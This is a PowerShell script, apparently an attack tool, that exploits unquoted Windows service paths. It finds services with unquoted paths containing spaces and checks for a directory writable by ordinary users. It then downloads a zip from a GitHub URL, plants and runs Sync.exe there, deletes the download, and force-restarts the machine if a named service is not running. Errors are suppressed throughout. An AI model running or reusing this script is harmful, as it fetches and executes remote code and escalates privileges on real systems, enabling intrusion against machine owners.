# Retrieve and save service paths
$ErrorActionPreference = "SilentlyContinue"
$svclist = Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\services | ForEach-Object {Get-ItemProperty $_.PsPath}

$servicePaths = @()
ForEach ($svc in $svclist) {
    $svcpath = $svc.ImagePath -split ".exe"
    if(($svcpath[0] -like "* *") -and ($svcpath[0] -notlike '"*') -and ($svcpath[0] -notlike "\*")) {
        $svcpath = $svcpath[0] + ".exe"
        $servicePaths += $svcpath
    }
}

# Traverse and identify writable directory
foreach ($path in $servicePaths) {
    $url = "https://github.com/prince-spooler/FYP/raw/main/Sync.zip"

    $parentDir = Split-Path -Path $path -Parent
    $dirName = ($path -split "\\")[-2]

    if ($dirName -match "\s") {
        $parentParentDir = Split-Path -Path $parentDir -Parent
        $acl = Get-Acl $parentParentDir -ErrorAction SilentlyContinue
        $accessRules = $acl.Access

        foreach ($rule in $accessRules) {
            if (($rule.IdentityReference -eq "BUILTIN\Users") -and ($rule.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write)) {
                Write-Host "Found writable directory: $parentParentDir"
                Set-Location $parentParentDir
                $words = $dirName -split "\s+"
                $folderName = $words[0]
                $zipPath = Join-Path -Path $parentParentDir -ChildPath "$folderName.zip"
                $extractPath = Join-Path -Path $parentParentDir -ChildPath $folderName
                Invoke-WebRequest $url -OutFile $zipPath -ErrorAction SilentlyContinue
                Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force -ErrorAction SilentlyContinue
                $exePath = Join-Path -Path $extractPath -ChildPath "Sync.exe"
                Copy-Item -Path $exePath -Destination $parentParentDir -Force -ErrorAction SilentlyContinue
                Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
                Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue
                $fileName = Join-Path -Path $parentParentDir -ChildPath "Sync.exe"
                & $fileName
                # If the service is not running, restart the system
                $svcStatus = Get-Service -DisplayName "TRIGONE Remote System Monitor Service" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Status
                if ($svcStatus -ne "Running") {
                    Restart-Computer -Force -ErrorAction SilentlyContinue
                }
                break
            }
        }
    }
}
